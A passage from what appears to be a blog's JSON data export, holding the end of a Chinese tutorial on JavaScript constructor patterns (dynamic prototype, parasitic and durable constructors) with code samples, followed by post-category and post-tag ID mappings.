rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“function”</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);<br>person1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;<br> &nbsp; &nbsp;<br>&nbsp; o.job = job;<br> &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//“wei”</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“|”</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“red”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“blue”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“green”</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“weiqi”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p></p>\n<blockquote>\n<p>转自：<a href=\"http://blog.csdn.net/u014346301/article/details/52204967\">http://blog.csdn.net/u014346301/article/details/52204967</a></p>\n</blockquote>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cj2mm9xna00025es5j95toscr","category_id":"cj2mm9xnh00065es5r697fi22","_id":"cj2mm9xns000h5es5gd7oet5r"},{"post_id":"cj2mm9xnd00045es5bo8fsan5","category_id":"cj2mm9xnq000d5es5d5ma5ov1","_id":"cj2mm9xnz000o5es50chhc929"},{"post_id":"cj2mm9xnk00085es5b6dnsynd","category_id":"cj2mm9xnh00065es5r697fi22","_id":"cj2mm9xo3000u5es5mzwmwzmq"},{"post_id":"cj2mm9xnn000a5es5qy01vdnd","category_id":"cj2mm9xo0000p5es5h4026xxj","_id":"cj2mm9xo700105es58gcwncun"},{"post_id":"cj2mm9xnr000g5es59b4ahbif","category_id":"cj2mm9xo4000v5es5fht6cr5g","_id":"cj2mm9xod00175es5a6umxuap"},{"post_id":"cj2mm9xo6000z5es5qw92y846","category_id":"cj2mm9xnh00065es5r697fi22","_id":"cj2mm9xoe001c5es5loywl8wp"},{"post_id":"cj2mm9xnt000i5es59eepn69y","category_id":"cj2mm9xo4000v5es5fht6cr5g","_id":"cj2mm9xog001f5es5o2ym06kq"},{"post_id":"cj2mm9xof001e5es5o72ramqp","category_id":"cj2mm9xnh00065es5r697fi22","_id":"cj2mm9xoj001m5es5hguu6dps"},{"post_id":"cj2mm9xnx000l5es5xmwccl8i","category_id":"cj2mm9xod00195es5052rl3wq","_id":"cj2mm9xom001r5es58lug5gz2"},{"post_id":"cj2mm9xnx000n5es5rpilsf0p","category_id":"cj2mm9xoi001i5es5z9f1brci","_id":"cj2mm9xop001w5es5490zzngu"},{"post_id":"cj2mm9xom001t5es5d8cij0we","category_id":"cj2mm9xnh00065es5r697fi22","_id":"cj2mm9xoq00215es5ctbm83ob"},{"post_id":"cj2mm9xo1000r5es5st1rcfzt","category_id":"cj2mm9xom001p5es5oazd1bqe","_id":"cj2mm9xor00245es5yyqemuny"},{"post_id":"cj2mm9xo3000t5es5w3mlp13f","category_id":"cj2mm9xop001x5es5i02ax80h","_id":"cj2mm9xov002b5es5pkcyulg8"},{"post_id":"cj2mm9xos00285es5xv7acyo4","category_id":"cj2mm9xnh00065es5r697fi22","_id":"cj2mm9xox002g5es5a1yn05ds"},{"post_id":"cj2mm9xot002a5es5sowcs1dv","category_id":"cj2mm9xnh00065es5r697fi22","_id":"cj2mm9xoy002j5es5qt7c5q5s"},{"post_id":"cj2mm9xo700145es511yerxh9","category_id":"cj2mm9xor00265es58irtc2ar","_id":"cj2mm9xp0002o5es5trhqlwzp"},{"post_id":"cj2mm9xow002d5es51c2gin6t","category_id":"cj2mm9xo4000v5es5fht6cr5g","_id":"cj2mm9xp2002r5es5kiyb9j5r"},{"post_id":"cj2mm9xox002i5es5hihxfush","category_id":"cj2mm9xo0000p5es5h4026xxj","_id":"cj2mm9xp3002w5es57kmy3anq"},{"post_id":"cj2mm9xod001a5es5iaspsm2i","category_id":"cj2mm9xow002e5es5670ebwul","_id":"cj2mm9xp4002z5es59rjj6uh3"},{"post_id":"cj2mm9xp0002q5es5s6ektd48","category_id":"cj2mm9xod00195es5052rl3wq","_id":"cj2mm9xp500335es5zb4gb8on"},{"post_id":"cj2mm9xoh001h5es56e5zb5wz","category_id":"cj2mm9xoz002m5es5zwuy8cwm","_id":"cj2mm9xp700375es5hdocje9z"},{"post_id":"cj2mm9xp2002t5es5caq9ht5u","category_id":"cj2mm9xo4000v5es5fht6cr5g","_id":"cj2mm9xp8003a5es52k42rk9l"},{"post_id":"cj2mm9xoo001v5es5zkhqw3u3","category_id":"cj2mm9xp3002v5es5ven2rlr1","_id":"cj2mm9xpa003e5es53lums5r7"},{"post_id":"cj2mm9xp500315es5eq2culv7","category_id":"cj2mm9xo4000v5es5fht6cr5g","_id":"cj2mm9xpe003h5es58ya6nuui"},{"post_id":"cj2mm9xp700395es5xck3yl9k","category_id":"cj2mm9xo4000v5es5fht6cr5g","_id":"cj2mm9xpf003l5es5amhyqya1"},{"post_id":"cj2mm9xoq00235es56c9zcbsq","category_id":"cj2mm9xp500355es5u9endv9t","_id":"cj2mm9xpi003o5es5m1cho46e"},{"post_id":"cj2mm9xp9003d5es5owkh73tb","category_id":"cj2mm9xow002e5es5670ebwul","_id":"cj2mm9xpj003s5es5qqe3x8jt"},{"post_id":"cj2mm9xpg003n5es5iafltgn1","category_id":"cj2mm9xor00265es58irtc2ar","_id":"cj2mm9xpk003v5es5sewjzihs"},{"post_id":"cj2mm9xpk003x5es5yojmiidf","category_id":"cj2mm9xp3002v5es5ven2rlr1","_id":"cj2mm9xpo00455es501nby4hw"},{"post_id":"cj2mm9xpl00415es5elpe3l57","category_id":"cj2mm9xnh00065es5r697fi22","_id":"cj2mm9xpo00475es5pgzu915v"},{"post_id":"cj2mm9xpj003u5es5dv5tensm","category_id":"cj2mm9xpl003z5es5iwg38wzm","_id":"cj2mm9xpp00495es5hel9wbj9"},{"post_id":"cj2mm9xqq004k5es5n5426caf","category_id":"cj2mm9xo4000v5es5fht6cr5g","_id":"cj2mm9xqv004m5es5fho29qqs"}],"PostTag":[{"post_id":"cj2mm9xna00025es5j95toscr","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xnr000f5es5ymh1a475"},{"post_id":"cj2mm9xnd00045es5bo8fsan5","tag_id":"cj2mm9xnq000e5es5pgogl54e","_id":"cj2mm9xnx000m5es5magzhh3c"},{"post_id":"cj2mm9xnk00085es5b6dnsynd","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xo3000s5es5e60giwig"},{"post_id":"cj2mm9xnn000a5es5qy01vdnd","tag_id":"cj2mm9xo0000q5es59212k2zj","_id":"cj2mm9xo5000y5es5colwn96p"},{"post_id":"cj2mm9xo4000x5es5dlqzxc4n","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xo700115es54wro9l1z"},{"post_id":"cj2mm9xnp000c5es5dls65m31","tag_id":"cj2mm9xo4000w5es5ab5ss9id","_id":"cj2mm9xob00155es542o42dft"},{"post_id":"cj2mm9xo6000z5es5qw92y846","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xod00185es5r88na32v"},{"post_id":"cj2mm9xob00165es536dqijap","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xof001d5es5dgatkv58"},{"post_id":"cj2mm9xnr000g5es59b4ahbif","tag_id":"cj2mm9xo700135es5cjjqdv0l","_id":"cj2mm9xog001g5es55eevoeo7"},{"post_id":"cj2mm9xof001e5es5o72ramqp","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xoi001k5es518cmd3ax"},{"post_id":"cj2mm9xnt000i5es59eepn69y","tag_id":"cj2mm9xo700135es5cjjqdv0l","_id":"cj2mm9xoj001n5es5ejb6r7q0"},{"post_id":"cj2mm9xoi001l5es5e2cvd5zh","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xom001s5es5hsen9on2"},{"post_id":"cj2mm9xnx000l5es5xmwccl8i","tag_id":"cj2mm9xoi001j5es5w234b3zc","_id":"cj2mm9xoo001u5es5f067z524"},{"post_id":"cj2mm9xok001o5es56slslmkw","tag_id":"cj2mm9xo4000w5es5ab5ss9id","_id":"cj2mm9xop001z5es59aly4ma8"},{"post_id":"cj2mm9xom001t5es5d8cij0we","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xoq00225es52vwj786e"},{"post_id":"cj2mm9xnx000n5es5rpilsf0p","tag_id":"cj2mm9xom001q5es5w5iqx8rh","_id":"cj2mm9xor00255es5hl6g2or9"},{"post_id":"cj2mm9xo1000r5es5st1rcfzt","tag_id":"cj2mm9xop001y5es5c01b0z3s","_id":"cj2mm9xot00295es53bih925h"},{"post_id":"cj2mm9xos00285es5xv7acyo4","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xov002c5es5dfctn0fb"},{"post_id":"cj2mm9xot002a5es5sowcs1dv","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xox002h5es535y28pg7"},{"post_id":"cj2mm9xo3000t5es5w3mlp13f","tag_id":"cj2mm9xos00275es5ah9uieh4","_id":"cj2mm9xoy002k5es53i0mf1ya"},{"post_id":"cj2mm9xow002d5es51c2gin6t","tag_id":"cj2mm9xo700135es5cjjqdv0l","_id":"cj2mm9xp0002p5es55b0inyj4"},{"post_id":"cj2mm9xo700145es511yerxh9","tag_id":"cj2mm9xox002f5es5lntkfjf0","_id":"cj2mm9xp2002s5es5declscvs"},{"post_id":"cj2mm9xoy002l5es56f2esujn","tag_id":"cj2mm9xox002f5es5lntkfjf0","_id":"cj2mm9xp3002x5es5oycu4tlu"},{"post_id":"cj2mm9xp0002q5es5s6ektd48","tag_id":"cj2mm9xoi001j5es5w234b3zc","_id":"cj2mm9xp400305es53wn0yzg0"},{"post_id":"cj2mm9xod001a5es5iaspsm2i","tag_id":"cj2mm9xox002f5es5lntkfjf0","_id":"cj2mm9xp500345es57mm2zb10"},{"post_id":"cj2mm9xp2002t5es5caq9ht5u","tag_id":"cj2mm9xo700135es5cjjqdv0l","_id":"cj2mm9xp700385es5ws7jh5yn"},{"post_id":"cj2mm9xoh001h5es56e5zb5wz","tag_id":"cj2mm9xp2002u5es599kentfm","_id":"cj2mm9xp9003b5es57wswh4do"},{"post_id":"cj2mm9xp500315es5eq2culv7","tag_id":"cj2mm9xo700135es5cjjqdv0l","_id":"cj2mm9xpa003f5es5ic16iptr"},{"post_id":"cj2mm9xp600365es5z3yzxs7e","tag_id":"cj2mm9xo4000w5es5ab5ss9id","_id":"cj2mm9xpe003i5es5y4h6bl4w"},{"post_id":"cj2mm9xoo001v5es5zkhqw3u3","tag_id":"cj2mm9xp500325es5dfuadeta","_id":"cj2mm9xpf003m5es55dqps9ps"},{"post_id":"cj2mm9xoo001v5es5zkhqw3u3","tag_id":"cj2mm9xo700135es5cjjqdv0l","_id":"cj2mm9xpi003p5es5wtpyxzil"},{"post_id":"cj2mm9xp700395es5xck3yl9k","tag_id":"cj2mm9xo700135es5cjjqdv0l","_id":"cj2mm9xpj003t5es5jmrfavgo"},{"post_id":"cj2mm9xp9003d5es5owkh73tb","tag_id":"cj2mm9xox002f5es5lntkfjf0","_id":"cj2mm9xpk003w5es5azrvgxvj"},{"post_id":"cj2mm9xop00205es5poop5dq0","tag_id":"cj2mm9xos00275es5ah9uieh4","_id":"cj2mm9xpl00405es5ftw0mb6m"},{"post_id":"cj2mm9xpa003g5es579shmk9c","tag_id":"cj2mm9xox002f5es5lntkfjf0","_id":"cj2mm9xpn00425es56ejjoxhf"},{"post_id":"cj2mm9xpg003n5es5iafltgn1","tag_id":"cj2mm9xox002f5es5lntkfjf0","_id":"cj2mm9xpo00465es5nub4r1ac"},{"post_id":"cj2mm9xoq00235es56c9zcbsq","tag_id":"cj2mm9xpe003j5es5e80fxgtw","_id":"cj2mm9xpo00485es5l6n9g8oc"},{"post_id":"cj2mm9xpi003q5es5k1q1jlpj","tag_id":"cj2mm9xox002f5es5lntkfjf0","_id":"cj2mm9xpp004a5es5e5eeohab"},{"post_id":"cj2mm9xpj003u5es5dv5tensm","tag_id":"cj2mm9xox002f5es5lntkfjf0","_id":"cj2mm9xpp004b5es5m1dbvyns"},{"post_id":"cj2mm9xox002i5es5hihxfush","tag_id":"cj2mm9xo0000q5es59212k2zj","_id":"cj2mm9xpp004c5es5tfrgxrva"},{"post_id":"cj2mm9xox002i5es5hihxfush","tag_id":"cj2mm9xpj003r5es5ao4pui6a","_id":"cj2mm9xpp004d5es5puj94bo2"},{"post_id":"cj2mm9xpk003x5es5yojmiidf","tag_id":"cj2mm9xp500325es5dfuadet